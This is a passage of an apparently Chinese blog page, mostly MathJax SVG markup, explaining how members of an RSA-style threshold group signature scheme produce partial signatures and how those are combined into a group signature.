jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.054ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 466 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.29ex" height="1ex" role="img" focusable="false" viewBox="0 -431 570 442"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g></g></g></svg></mjx-container>。</p>
<h2 id="产生部分签名-1"><a href="#产生部分签名-1" class="headerlink" title="产生部分签名"></a>产生部分签名</h2><p>成员<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.118ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 936 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>计算消息摘要<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="10.458ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4622.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(849.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1905.6, 0)"><path data-c="1D43B" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mo" transform="translate(2793.6, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3182.6, 0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(4233.6, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，然后计算：</p>
<script type="math/tex; mode=display">x_i=x^{2\pi d_i}\bmod N</script><h2 id="产生组签名-1"><a href="#产生组签名-1" class="headerlink" title="产生组签名"></a>产生组签名</h2><p>若有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.817ex" height="1.441ex" role="img" focusable="false" viewBox="0 -626 361 637"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g></g></svg></mjx-container>个成员<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="16.956ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7494.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(936, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1325, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1947.7, 0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(2892.5, 0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(3651.5, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(4096.2, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(4374.2, 0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(5133.2, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(5689, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(6744.7, 0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mo" transform="translate(7105.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>产生正确的部分签名<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="8.75ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3867.5 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(469, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(763, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1774.7, 0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(2719.5, 0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(3478.5, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，则计算</p>
<script type="math/tex; mode=display">y=\prod_{i=1}^tx_i^{2\pi \lambda_{0,i}}\bmod N=x^{4\pi^2d}\bmod N</script><p>令<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="7.958ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 3517.6 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(466, 363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(988.2, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2044, 0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="msup" transform="translate(2544, 0)"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g><g data-mml-node="mn" transform="translate(570, 363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>，由欧几里得定理可知存在<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex" xmlns="http://www.w3.org/2000/svg" width="1.197ex" height="1.02ex" role="img" focusable="false" viewBox="0 -441 529 451"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 429 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>使得<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="12.811ex" height="2.283ex" role="img" focusable="false" viewBox="0 -759 5662.7 1009"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(477, 0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(910, 0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(1430, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1819, 0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 